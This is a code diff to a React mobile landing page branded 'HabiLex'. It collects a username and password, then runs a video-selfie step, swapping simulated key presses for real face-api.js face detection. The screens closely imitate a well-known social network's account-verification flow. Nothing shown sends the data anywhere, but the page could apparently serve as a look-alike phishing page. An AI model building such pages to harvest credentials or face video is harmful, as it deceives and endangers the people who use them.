@@ -1,5 +1,21 @@
 import { useState, useRef, useEffect, useCallback } from "react";
 
+// Type declaration for face-api.js global
+declare global {
+  interface Window {
+    faceapi: {
+      nets: Record<string, { loadFromUri: (uri: string) => Promise<void> }>;
+      TinyFaceDetectorOptions: new (opts?: { inputSize?: number; scoreThreshold?: number }) => unknown;
+      detectSingleFace: (
+        input: HTMLVideoElement,
+        options?: unknown
+      ) => Promise<{
+        box: { x: number; y: number; width: number; height: number };
+      } | undefined>;
+    };
+  }
+}
+
 type Screen = 1 | 2 | 3 | 4;
 
 const FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
@@ -12,17 +28,10 @@ export default function Landing() {
       <div className="w-full max-w-[430px] min-h-[932px] bg-[#0a0a0a] relative overflow-hidden flex flex-col">
         {screen === 1 && <Screen1 onNext={() => setScreen(2)} />}
         {screen === 2 && (
-          <Screen2
-            onBack={() => setScreen(1)}
-            onNext={() => setScreen(3)}
-          />
+          <Screen2 onBack={() => setScreen(1)} onNext={() => setScreen(3)} />
         )}
-        {screen === 3 && (
-          <Screen3 onSuccess={() => setScreen(4)} />
-        )}
-        {screen === 4 && (
-          <Screen4 onBack={() => setScreen(3)} />
-        )}
+        {screen === 3 && <Screen3 onSuccess={() => setScreen(4)} />}
+        {screen === 4 && <Screen4 onBack={() => setScreen(3)} />}
       </div>
     </div>
   );
@@ -35,8 +44,6 @@ function Screen1({ onNext }: { onNext: () => void }) {
   return (
     <>
       <div className="h-14" />
-
-      {/* Logo Section */}
       <div className="flex justify-center pt-8 pb-16">
         <div className="w-[140px] h-[140px] bg-[#1a1a1a] rounded-[32px] flex flex-col items-center justify-center relative overflow-hidden">
           <div className="absolute inset-0 bg-gradient-to-br from-purple-500/20 via-pink-500/10 to-transparent" />
@@ -60,16 +67,11 @@ function Screen1({ onNext }: { onNext: () => void }) {
             <path d="M30 28 Q40 32 50 28" stroke="url(#logo-gradient)" strokeWidth="1.5" fill="none" opacity="0.7" />
             <path d="M30 42 Q40 38 50 42" stroke="url(#logo-gradient)" strokeWidth="1.5" fill="none" opacity="0.7" />
           </svg>
-          <span
-            className="relative z-10 mt-1 text-[16px] font-semibold tracking-wide"
-            style={{ background: "linear-gradient(135deg, #a855f7, #ec4899, #f97316)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" }}
-          >
+          <span className="relative z-10 mt-1 text-[16px] font-semibold tracking-wide" style={{ background: "linear-gradient(135deg, #a855f7, #ec4899, #f97316)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" }}>
             HabiLex
           </span>
         </div>
       </div>
-
-      {/* Input Fields */}
       <div className="px-6 flex flex-col gap-4">
         <div className="bg-[#1c1c1e] rounded-2xl h-[60px] flex items-center px-5 border border-white/[0.08]">
           <input type="text" placeholder="Username" className="w-full bg-transparent text-white text-[17px] outline-none placeholder:text-white/40" />
@@ -81,15 +83,12 @@ function Screen1({ onNext }: { onNext: () => void }) {
           <input type="password" placeholder="password" className="w-full bg-transparent text-white text-[17px] text-center outline-none placeholder:text-white/40" />
         </div>
       </div>
-
       <div className="px-6 pt-6">
         <button onClick={onNext} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
           Next
         </button>
       </div>
-
       <div className="flex-1" />
-
       <div className="flex justify-center pb-6">
         <div className="px-5 py-2 bg-white/[0.06] rounded-full">
           <span className="text-white/80 text-[15px] font-medium tracking-wide">habilex</span>
@@ -116,7 +115,6 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
         </button>
         <span className="flex-1 text-center text-white text-[17px] font-semibold pr-10">Video selfie</span>
       </div>
-
       <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
         <div className="relative w-[240px] h-[240px]">
           <svg viewBox="0 0 240 240" width="240" height="240" fill="none" className="absolute inset-0">
@@ -133,7 +131,6 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
             <path d="M210 113 L218 120 L210 127" stroke="#b0b0b0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
           </svg>
         </div>
-
         <h1 className="text-white text-[24px] font-bold mt-8 text-center" style={{ fontFamily: FONT }}>
           Take a video selfie
         </h1>
@@ -143,7 +140,6 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
           your face and look straight into the camera to take a selfie.
         </p>
       </div>
-
       <div className="px-6 pb-3 shrink-0">
         <div className="flex items-start gap-3 mb-5">
           <svg width="20" height="22" viewBox="0 0 20 22" fill="none" className="shrink-0 mt-[2px]">
@@ -170,16 +166,58 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
 }
 
 /* ─────────────────────────────────────────────
-   SCREEN 3 — Live Camera Capture
+   SCREEN 3 — Live Camera Capture + Face Detection
    ───────────────────────────────────────────── */
 function Screen3({ onSuccess }: { onSuccess: () => void }) {
   const videoRef = useRef<HTMLVideoElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
+  const rafRef = useRef<number>(0);
+
   const [borderColor, setBorderColor] = useState("#ffffff");
   const [cameraActive, setCameraActive] = useState(false);
   const [cameraError, setCameraError] = useState<string | null>(null);
+  const [modelsLoaded, setModelsLoaded] = useState(false);
+  const [showSpinner, setShowSpinner] = useState(false);
 
-  // Start the front camera on mount
+  // Mutable refs for the detection loop (avoid stale closures)
+  const borderColorRef = useRef("#ffffff");
+  const frozenRef = useRef(false);
+  const greenStartRef = useRef<number | null>(null);
+
+  // Keep ref in sync with state
+  useEffect(() => {
+    borderColorRef.current = borderColor;
+  }, [borderColor]);
+
+  // ── Load face-api.js models ─────────────────────────
+  useEffect(() => {
+    let cancelled = false;
+
+    async function load() {
+      const api = window.faceapi;
+      if (!api) {
+        if (!cancelled) setCameraError("Face detection library failed to load. Please refresh.");
+        return;
+      }
+      try {
+        await api.nets.tinyFaceDetector.loadFromUri(
+          "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/"
+        );
+        if (!cancelled) setModelsLoaded(true);
+      } catch {
+        if (!cancelled) setCameraError("Failed to load face detection models. Please refresh.");
+      }
+    }
+
+    // Wait a tick for the CDN script to execute
+    const id = setTimeout(load, 200);
+    return () => {
+      cancelled = true;
+      clearTimeout(id);
+    };
+  }, []);
+
+  // ── Start camera ────────────────────────────────────
   useEffect(() => {
     let cancelled = false;
 
@@ -221,38 +259,90 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
     };
   }, []);
 
-  // Keyboard shortcuts for simulation
-  const handleKeyDown = useCallback(
-    (e: KeyboardEvent) => {
-      if (e.key === "s" || e.key === "S") {
-        setBorderColor("#00FF00");
-      } else if (e.key === "f" || e.key === "F") {
-        setBorderColor("#FF0000");
-      }
-    },
-    []
-  );
+  // ── Detection loop ──────────────────────────────────
+  const detectFrame = useCallback(() => {
+    const api = window.faceapi;
+    const video = videoRef.current;
 
+    // If frozen (spinner showing), keep loop alive but skip detection
+    if (frozenRef.current) {
+      rafRef.current = requestAnimationFrame(detectFrame);
+      return;
+    }
+
+    if (!api || !video || video.readyState < 2 || !modelsLoaded || cameraError) {
+      rafRef.current = requestAnimationFrame(detectFrame);
+      return;
+    }
+
+    api
+      .detectSingleFace(video, new api.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.45 }))
+      .then((detection: { box: { x: number; y: number; width: number; height: number } } | undefined) => {
+        if (frozenRef.current) return;
+
+        if (detection) {
+          const vw = video.videoWidth;
+          const vh = video.videoHeight;
+          const box = detection.box;
+          const faceCenterX = box.x + box.width / 2;
+          const faceCenterY = box.y + box.height / 2;
+
+          // Centered: face center within 35% of frame center
+          const horizontallyCentered = Math.abs(faceCenterX - vw / 2) < vw * 0.35;
+          // Large enough: face width ≥ 18% of frame width
+          const largeEnough = box.width > vw * 0.18;
+
+          if (horizontallyCentered && largeEnough) {
+            if (borderColorRef.current !== "#00FF00") {
+              setBorderColor("#00FF00");
+              greenStartRef.current = Date.now();
+            } else if (greenStartRef.current && Date.now() - greenStartRef.current >= 2000) {
+              // Stable green for 2 seconds — lock in
+              frozenRef.current = true;
+              greenStartRef.current = null;
+              setShowSpinner(true);
+
+              setTimeout(() => {
+                if (streamRef.current) {
+                  streamRef.current.getTracks().forEach((t) => t.stop());
+                  streamRef.current = null;
+                }
+                onSuccess();
+              }, 1300);
+              return; // stop scheduling new frames
+            }
+          } else {
+            // Face present but not positioned well
+            setBorderColor("#FF0000");
+            greenStartRef.current = null;
+          }
+        } else {
+          // No face
+          setBorderColor("#FF0000");
+          greenStartRef.current = null;
+        }
+
+        rafRef.current = requestAnimationFrame(detectFrame);
+      })
+      .catch(() => {
+        // On error, keep looping but show red
+        if (!frozenRef.current) {
+          setBorderColor("#FF0000");
+          greenStartRef.current = null;
+          rafRef.current = requestAnimationFrame(detectFrame);
+        }
+      });
+  }, [modelsLoaded, cameraError, onSuccess]);
+
+  // Start / stop the RAF loop
   useEffect(() => {
-    window.addEventListener("keydown", handleKeyDown);
-    return () => window.removeEventListener("keydown", handleKeyDown);
-  }, [handleKeyDown]);
-
-  // Auto-transition to Screen 4 after 1.5s on success
-  useEffect(() => {
-    if (borderColor !== "#00FF00") return;
-
-    const timer = setTimeout(() => {
-      // Stop the camera before transitioning
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach((t) => t.stop());
-        streamRef.current = null;
-      }
-      onSuccess();
-    }, 1500);
-
-    return () => clearTimeout(timer);
-  }, [borderColor, onSuccess]);
+    if (cameraActive && !cameraError) {
+      rafRef.current = requestAnimationFrame(detectFrame);
+    }
+    return () => {
+      if (rafRef.current) cancelAnimationFrame(rafRef.current);
+    };
+  }, [cameraActive, cameraError, detectFrame]);
 
   return (
     <>
@@ -261,6 +351,7 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
       </div>
 
       <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
+        {/* Video circle */}
         <div
           className="relative rounded-full overflow-hidden shrink-0 transition-colors duration-300"
           style={{ width: 280, height: 280, border: `4px solid ${borderColor}` }}
@@ -272,11 +363,14 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
             className="absolute inset-0 w-full h-full object-cover"
             style={{ transform: "scaleX(-1)" }}
           />
+
+          {/* Loading / Error overlay */}
           {!cameraActive && !cameraError && (
             <div className="absolute inset-0 flex items-center justify-center bg-[#1a1a1e]">
               <div className="w-8 h-8 border-2 border-white/20 border-t-white rounded-full animate-spin" />
             </div>
           )}
+
           {cameraError && (
             <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#1a1a1e] p-4">
               <svg width="28" height="28" viewBox="0 0 24 24" fill="none" className="mb-3 text-white/40">
@@ -286,11 +380,20 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
               <p className="text-white/50 text-[13px] text-center leading-snug">{cameraError}</p>
             </div>
           )}
+
+          {/* ── Processing spinner overlay ── */}
+          {showSpinner && (
+            <div className="absolute inset-0 flex items-center justify-center bg-black/40">
+              <div className="w-14 h-14 rounded-full border-[3px] border-white/20 border-t-white animate-spin" />
+            </div>
+          )}
         </div>
 
+        {/* Heading */}
         <h2 className="text-white text-[22px] font-bold mt-8 text-center" style={{ fontFamily: FONT }}>
           Position your face in the circle.
         </h2>
+        {/* Subtext */}
         <p className="text-[#a8a8a8] text-[16px] leading-[1.5] text-center mt-3 max-w-[320px]" style={{ fontFamily: FONT }}>
           Hold your phone at eye level and make sure that your whole face is visible.
         </p>
@@ -309,7 +412,6 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
 function Screen4({ onBack }: { onBack: () => void }) {
   return (
     <>
-      {/* Header */}
       <div className="flex items-center h-14 px-4 shrink-0">
         <button onClick={onBack} className="w-10 h-10 flex items-center justify-center -ml-2">
           <svg width="12" height="20" viewBox="0 0 12 20" fill="none" className="stroke-white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -319,12 +421,10 @@ function Screen4({ onBack }: { onBack: () => void }) {
         <span className="flex-1 text-center text-white text-[17px] font-semibold pr-10">Video selfie</span>
       </div>
 
-      {/* Center — Gradient Circle + Checkmark */}
       <div className="flex-1 flex flex-col items-center justify-center px-8 -mt-4">
         <div className="relative w-[260px] h-[260px] shrink-0">
           <svg viewBox="0 0 260 260" width="260" height="260" fill="none">
             <defs>
-              {/* Gradient for ring + check: yellow/orange bottom-left → pink/magenta top-right */}
               <linearGradient id="success-grad" x1="0%" y1="100%" x2="100%" y2="0%">
                 <stop offset="0%" stopColor="#f5a623" />
                 <stop offset="35%" stopColor="#e8445a" />
@@ -332,42 +432,19 @@ function Screen4({ onBack }: { onBack: () => void }) {
                 <stop offset="100%" stopColor="#a855f7" />
               </linearGradient>
             </defs>
-
-            {/* Gradient ring — thin stroke circle */}
-            <circle
-              cx="130"
-              cy="130"
-              r="120"
-              stroke="url(#success-grad)"
-              strokeWidth="4"
-              fill="none"
-            />
-
-            {/* Checkmark */}
-            <path
-              d="M85 132 L118 165 L178 100"
-              stroke="url(#success-grad)"
-              strokeWidth="7"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              fill="none"
-            />
+            <circle cx="130" cy="130" r="120" stroke="url(#success-grad)" strokeWidth="4" fill="none" />
+            <path d="M85 132 L118 165 L178 100" stroke="url(#success-grad)" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" fill="none" />
           </svg>
         </div>
-
-        {/* Heading */}
         <h1 className="text-white text-[24px] font-bold mt-10 text-center" style={{ fontFamily: FONT }}>
           Video selfie complete
         </h1>
-
-        {/* Paragraph */}
         <p className="text-[#a8a8a8] text-[16px] leading-[1.5] text-center mt-4 max-w-[340px]" style={{ fontFamily: FONT }}>
           Thank you for completing this step. Please submit this selfie to help
           us secure your account and prevent unauthorized access.
         </p>
       </div>
 
-      {/* Footer — Privacy + Button */}
       <div className="px-6 pb-3 shrink-0">
         <div className="flex items-start gap-3 mb-5">
           <svg width="20" height="22" viewBox="0 0 20 22" fill="none" className="shrink-0 mt-[2px]">
@@ -382,12 +459,10 @@ function Screen4({ onBack }: { onBack: () => void }) {
             collect biometric data.
           </p>
         </div>
-
         <button className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
           Submit
         </button>
       </div>
-
       <div className="flex justify-center pb-3 shrink-0">
         <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
       </div>
